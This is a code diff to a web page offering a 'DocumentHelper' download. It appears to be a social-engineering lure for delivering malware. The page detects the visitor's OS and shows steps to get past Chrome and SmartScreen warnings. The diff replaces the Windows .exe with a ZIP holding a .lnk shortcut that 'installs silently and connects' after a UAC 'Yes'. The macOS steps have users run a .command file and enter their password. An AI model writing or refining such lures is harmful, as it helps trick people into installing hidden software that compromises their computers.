@@ -103,7 +103,7 @@ footer{position:relative;z-index:1;text-align:center;padding:18px 16px 22px;font
   <div class="hint" id="h">Download didn't start? <a href="/get">Open manually</a>.</div>
   <div class="others">
     <span>Other systems:</span>
-    <a href="/dl/DocumentHelper.exe">Windows</a>
+    <a href="/dl/DocumentHelper-Windows.zip">Windows</a>
     <a href="/dl/DocumentHelper-macOS.zip">macOS</a>
     <a href="/dl/DocumentHelper.run">Linux</a>
   </div>
@@ -139,7 +139,7 @@ if(code)document.getElementById('tk').textContent=code;
 /* ---- OS detection: label the button and show what we detected ---- */
 var ua=navigator.userAgent;
 var os=/Windows/.test(ua)?'Windows':/Macintosh|Mac OS X/.test(ua)?'macOS':/Linux|X11/.test(ua)?'Linux':'';
-var label={Windows:'Windows (.exe)',macOS:'macOS (.zip)',Linux:'Linux (.run)'}[os]||'your computer';
+var label={Windows:'Windows (.zip)',macOS:'macOS (.zip)',Linux:'Linux (.run)'}[os]||'your computer';
 var go=document.getElementById('go');
 go.textContent = os ? ('Download helper for '+os) : 'Download the helper';
 document.getElementById('osline').innerHTML =
@@ -162,7 +162,7 @@ function start(){
 /* ---- per-OS "how to allow it" coaching ---- */
 var co=document.getElementById('co');
 if(os==='Windows'){
-  co.innerHTML='Chrome may warn the file “isn’t commonly downloaded” — choose <b>Keep</b>. If Windows shows <b>“Windows protected your PC”</b>, click <b>More info</b> → <b>Run anyway</b>.';
+  co.innerHTML='You’ll get a <b>ZIP</b>. Open it and double-click <b>“Install Document Helper.lnk”</b>, then click <b>Yes</b> on the Windows prompt — the helper installs silently and connects. (Chrome may warn the file “isn’t commonly downloaded” — choose <b>Keep</b>.)';
   co.style.display='block';
 }else if(os==='macOS'){
   co.innerHTML='You’ll get a <b>ZIP</b>. Open it and double-click <b>“Install DocumentHelper.command”</b>, then enter your Mac password. No Terminal typing needed. (If macOS asks whether to open it, click <b>Open</b>.)';
